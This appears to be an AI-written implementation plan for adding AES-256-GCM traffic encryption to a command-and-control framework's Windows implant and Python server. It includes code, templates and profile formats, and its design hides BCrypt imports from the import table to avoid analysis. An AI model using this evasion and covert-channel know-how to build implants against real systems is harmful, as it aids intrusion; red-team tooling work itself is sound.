# Encryption Transform Plan (`symcrypt`)

## Summary

Add `{ op = "symcrypt", key = '\xDE\xAD...' }` as a new transform operation that encrypts/decrypts the payload using AES-256-GCM. The implementation follows the same pattern as every other transform: a Python function pair for the server, a C++ function pair for the implant, and Jinja macro entries in the template dispatchers.

---

## Your Concern: Body Template Scope

Confirmed by reading `raw_comms.h.j2`: **transforms apply only to the token value, not the surrounding body template.** The flow is:

```
1. metadata/payload string is transformed (encrypt → base64 → prepend → etc.)
2. Body template is built: body = "aaaa<OUTPUT>bbbb"
3. Token replacement: replace_token(body, "<OUTPUT>", transformed_payload)
```

So for `body = "aaaa<OUTPUT>bbbb"`, `aaaa` and `bbbb` remain plaintext — only the `<OUTPUT>` content is encrypted. This is already how it works for every other transform.

---

## Algorithm: AES-256-GCM

| Property | Value |
|---|---|
| Algorithm | AES-256-GCM (Galois/Counter Mode) |
| Key size | 32 bytes (256 bits) |
| Nonce | 12 bytes, randomly generated per message |
| Auth tag | 16 bytes |
| Overhead per message | 28 bytes (12 nonce + 16 tag) |

**Why AES-256-GCM:**

- **Authenticated encryption** — prevents traffic modification between implant and server, not just eavesdropping. A MITM injecting task data would fail the auth tag check.
- **Windows-native** — available via BCrypt (CNG), which is in `bcrypt.dll` on every modern Windows install. No need to ship a crypto library. BCrypt calls can go through `lazy_importer` to keep them out of the IAT.
- **Python-native** — the `cryptography` library (already a common dependency) handles AES-GCM trivially. Alternatively, PyCryptodome or even `Crypto.Cipher.AES`.
- **Stream-like** — GCM is CTR-mode under the hood, so ciphertext is the same length as plaintext (no block padding). Output size = input size + 28 bytes.
- **Battle-tested** — used in TLS 1.3, IPsec, SSH. No known practical attacks.

**Why not the alternatives:**

| Alternative | Reason to skip |
|---|---|
| AES-CBC | Requires PKCS7 padding (variable output size), not authenticated (malleable), IV handling is subtler |
| ChaCha20-Poly1305 | Not available in Windows BCrypt — would require bundling a library (libsodium/monocypher). Great algorithm, wrong platform. |
| RC4 | Cryptographically broken. The existing `mask` (XOR) transform already fills the "fast obfuscation" role. |
| AES-128-GCM | Valid alternative — 16-byte key instead of 32. Could offer this as a variant later, but AES-256 is the default "serious" choice. |

---

## Wire Format

The encrypted output is a single blob: `[nonce][tag][ciphertext]`.

```
Bytes:  [0..11]          [12..27]         [28..N]
Field:  12-byte nonce    16-byte tag      ciphertext (same length as plaintext)
```

No length headers or delimiters — the nonce and tag are fixed-size, so the receiver reads the first 12 bytes as nonce, the next 16 as tag, and the rest as ciphertext.

This blob then passes through subsequent transforms normally (base64, prepend, etc.).

---

## Profile Format

```toml
[raw.post.client.output]
transforms = [
    { op = "symcrypt", key = '\xDE\xAD\xBE\xEF\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C' },
    { op = "base64url" },
    { op = "prepend", val = '\x23' }
]
```

- `key`: 32 bytes (AES-256), specified as `\xNN` hex escapes in a TOML single-quoted literal string. Parsed by the existing `malleable_string_to_bytes()`.
- Validation: server rejects profiles where `symcrypt` key is not exactly 32 bytes.
- Key generation: a helper in the profile UI ("Generate Key" button) or a CLI one-liner: `python -c "import os; print(''.join(f'\\x{b:02X}' for b in os.urandom(32)))"`.

---

## Transform Ordering

Like every other transform, order matters. Transforms are applied top-to-bottom on the sender, reversed bottom-to-top on the receiver.

**Recommended order for encrypted profiles:**

```toml
transforms = [
    { op = "symcrypt", key = '...' },    # 1. Encrypt the raw payload FIRST
    { op = "base64url" },                 # 2. Encode the binary ciphertext for text-safe transport
    { op = "prepend", val = '\xF0\x02' }  # 3. Add protocol framing on top
]
```

If `symcrypt` is placed *after* base64, you'd be encrypting the base64 string — which works, but wastes cycles encoding before encrypting and produces larger ciphertext. Encrypt first, then encode.

If `symcrypt` is placed *after* prepend, the prepend bytes get encrypted and the server can't use them for disambiguation. Prepend/append framing should always be outermost (last in the list).

---

## Implementation: 6 Touchpoints

### 1. Server — `server/listeners/transform.py`

Two new functions following the existing pattern:

```python
def symcrypt_encrypt(data: bytes, key: bytes) -> bytes:
    """AES-256-GCM encrypt. Returns nonce + tag + ciphertext."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    
    if len(key) != 32:
        raise ValueError(f"symcrypt key must be 32 bytes, got {len(key)}")
    
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    ciphertext_and_tag = aesgcm.encrypt(nonce, data, None)
    # cryptography lib appends the 16-byte tag to ciphertext
    return nonce + ciphertext_and_tag


def symcrypt_decrypt(data: bytes, key: bytes) -> bytes:
    """AES-256-GCM decrypt. Expects nonce + tag + ciphertext."""
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    
    if len(key) != 32:
        raise ValueError(f"symcrypt key must be 32 bytes, got {len(key)}")
    if len(data) < 28:
        raise ValueError(f"symcrypt data too short ({len(data)} bytes, need >=28)")
    
    nonce = data[:12]
    ciphertext_and_tag = data[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ciphertext_and_tag, None)
```

Add to `apply_python_transforms`:
```python
elif op == "symcrypt":
    key_bytes = val if isinstance(val, bytes) else malleable_string_to_bytes(str(val))
    current_data = symcrypt_encrypt(current_data, key_bytes)
```

Add to `reverse_python_transforms`:
```python
elif op == "symcrypt":
    key_bytes = val if isinstance(val, bytes) else malleable_string_to_bytes(str(val))
    current_data = symcrypt_decrypt(current_data, key_bytes)
```

### 2. Implant C++ — `data/transforms/transforms.cpp` + `transforms.h`

Two new functions using Windows BCrypt (CNG):

```cpp
#include <bcrypt.h>

// Encrypt in-place: replaces data with [12-byte nonce][16-byte tag][ciphertext]
void symcrypt_encrypt(std::string& data, const std::string& key);

// Decrypt in-place: expects [12-byte nonce][16-byte tag][ciphertext], replaces with plaintext
void symcrypt_decrypt(std::string& data, const std::string& key);
```

The implementation uses:
- `BCryptOpenAlgorithmProvider` with `BCRYPT_AES_ALGORITHM`
- `BCryptSetProperty` to set `BCRYPT_CHAINING_MODE` to `BCRYPT_CHAIN_MODE_GCM`
- `BCryptGenerateSymmetricKey` with the 32-byte key
- `BCryptEncrypt` / `BCryptDecrypt` with `BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO`
- `BCryptGenRandom` for the 12-byte nonce

All BCrypt calls should go through `lazy_importer` (add `WinApi::` wrappers) to keep them out of the IAT. BCrypt functions live in `bcrypt.dll`, which needs to be added to the link libraries.

Error handling: on decrypt failure (bad tag = tampered data), `data` is cleared and a `DEBUG_LOG` is emitted. This follows the crash-resistance pattern from the cleanup — never throw, never crash.

### 3. CMakeLists.txt — Link `bcrypt`

```cmake
target_link_libraries(Implant_v01_exe PRIVATE
    BofRunner
    iphlpapi
    ws2_32
    crypt32
    bcrypt        # <-- add here, after crypt32
    ntdll
)
```

Same for the DLL target. Link order note: `bcrypt` has no dependency on `crypt32` or vice versa, so position after `crypt32` and before `ntdll` is fine.

### 4. Jinja Templates — `transform.j2` + `transform_reverse.j2`

Add to `transform.j2`:
```jinja
[% macro trans_symcrypt(target, key) %]
    // [Transform] AES-256-GCM Encrypt
    symcrypt_encrypt([[ target ]], "[[ key ]]"s);
[% endmacro %]
```

Add to dispatcher `render_transform`:
```jinja
[% elif transform_object.statement == 'symcrypt' %]
    [[ trans_symcrypt(target_var, transform_object.value) ]]
```

Add to `transform_reverse.j2`:
```jinja
[% macro rev_symcrypt(target, key) %]
    // [Reverse Transform] AES-256-GCM Decrypt
    symcrypt_decrypt([[ target ]], "[[ key ]]"s);
[% endmacro %]
```

Add to dispatcher `render_reverse_transform`:
```jinja
[% elif transform_object.statement == 'symcrypt' %]
    [[ rev_symcrypt(target_var, transform_object.value) ]]
```

### 5. Context Generator — `context_raw.py`

The existing `_cpp_safe_transforms()` already processes `val` fields through `_val_to_cpp_octal()`. The `symcrypt` key is stored in the `key` field, not `val`. Two options:

**Option A (rename to `val` at parse time):** In `_cpp_safe_transforms`, map `key` → `val` so the Jinja template sees it the same way as every other valued transform:

```python
def _cpp_safe_transforms(transforms: list) -> list:
    result = []
    for t in transforms:
        t2 = dict(t)
        # Normalize: symcrypt uses 'key' in TOML, but template reads 'val'
        if t2.get("op") == "symcrypt" and "key" in t2:
            t2["val"] = t2.pop("key")
        if "val" in t2:
            t2["val"] = _val_to_cpp_octal(t2["val"])
        result.append(t2)
    return result
```

**Option B (use `key` directly):** Keep `key` as a separate field and have the Jinja template read `transform_object.key`. This means touching the dispatcher differently.

**Recommendation: Option A.** It keeps the Jinja templates uniform — every transform that has a parameter reads it from `value`. The profile TOML uses `key` for readability; the build pipeline normalizes it.

### 6. WinApi Wrappers — `defense/winapi.h`

Add lazy_importer wrappers for the BCrypt functions used:

```cpp
static NTSTATUS BCryptOpenAlgorithmProvider(
    BCRYPT_ALG_HANDLE* phAlgorithm, LPCWSTR pszAlgId,
    LPCWSTR pszImplementation, ULONG dwFlags) {
    return LI_FN(BCryptOpenAlgorithmProvider)(phAlgorithm, pszAlgId, pszImplementation, dwFlags);
}
// ... plus BCryptSetProperty, BCryptGenerateSymmetricKey, BCryptEncrypt,
//     BCryptDecrypt, BCryptDestroyKey, BCryptCloseAlgorithmProvider, BCryptGenRandom
```

---

## Key Storage in Compiled Binary

The key is embedded in the compiled C++ source as a string literal (via the Jinja template). This is the same way `mask` XOR keys and `prepend`/`append` values are stored today.

The key is **not** additionally obfuscated at rest in the binary. It sits in `.rdata` like every other transform value. This is acceptable because:
1. The key is 32 bytes of random data with no recognizable pattern
2. An analyst who can reverse the binary can also extract XOR keys, profile structure, callback hosts, etc. — the key is not the last line of defense
3. The purpose is wire encryption, not binary-at-rest encryption

If binary-at-rest key protection becomes a priority later, it can be layered on independently (e.g., XOR the key with a compile-time constant, decrypt at first use).

---

## Validation & Error Handling

| Location | Check | On failure |
|---|---|---|
| Profile upload/preview (server) | `symcrypt` key must be exactly 32 bytes | Reject with clear error: "symcrypt key must be 32 bytes (AES-256), got N" |
| `symcrypt_encrypt` (server) | Key length | `raise ValueError` |
| `symcrypt_decrypt` (server) | Data length >= 28 bytes | `raise ValueError` |
| `symcrypt_decrypt` (server) | Auth tag verification | `cryptography` raises `InvalidTag` — caught, logged, re-raised |
| `symcrypt_encrypt` (implant) | BCrypt API failures | `DEBUG_LOG`, leave data unchanged |
| `symcrypt_decrypt` (implant) | Auth tag mismatch / data too short | `DEBUG_LOG`, clear data (return empty) |

---

## Dependencies

| Side | Dependency | Status |
|---|---|---|
| Server (Python) | `cryptography` library | Check if already in requirements. If not, add it. Standard, widely used. |
| Implant (C++) | `bcrypt.dll` (Windows CNG) | Ships with Windows Vista+. Add `bcrypt` to CMake link libs. |
| Implant (C++) | `<bcrypt.h>` header | Available in MinGW-w64 cross-compiler toolchain. |

---

## Test Plan

1. **Unit test (Python):** Encrypt then decrypt with same key → plaintext matches. Decrypt with wrong key → raises `InvalidTag`.
2. **Round-trip test (Python):** `apply_python_transforms` then `reverse_python_transforms` on a chain containing `symcrypt` + `base64url` + `prepend` → original data recovered.
3. **Profile validation test:** Upload profile with 16-byte key → rejected. 32-byte key → accepted.
4. **Integration test (live implant):** Add a test profile with `symcrypt` enabled, build implant against it, verify tasks and responses decode correctly end-to-end. This would go in `test_implant_responses.py`.
5. **Cross-compatibility:** Verify the Python `cryptography` library and Windows BCrypt produce identical ciphertext for the same nonce+key+plaintext (write a known-answer test).

---

## File Change Summary

| File | Change |
|---|---|
| `server/listeners/transform.py` | Add `symcrypt_encrypt`, `symcrypt_decrypt`, wire into `apply_python_transforms` / `reverse_python_transforms` |
| `implant_templates/.../data/transforms/transforms.h` | Add `symcrypt_encrypt`, `symcrypt_decrypt` declarations |
| `implant_templates/.../data/transforms/transforms.cpp` | Add AES-256-GCM implementation via BCrypt |
| `implant_templates/.../defense/winapi.h` | Add BCrypt lazy_importer wrappers |
| `implant_templates/.../templates/transform.j2` | Add `trans_symcrypt` macro + dispatcher entry |
| `implant_templates/.../templates/transform_reverse.j2` | Add `rev_symcrypt` macro + dispatcher entry |
| `implant_templates/.../CMakeLists.txt` | Add `bcrypt` to link libraries |
| `server/modules/implant_builder/context_generators/context_raw.py` | Normalize `key` → `val` in `_cpp_safe_transforms` |
| `tests/server/test_profiles.py` | Add symcrypt key validation tests |
| Profile TOML docs in CLAUDE.md | Document `symcrypt` op and key format |
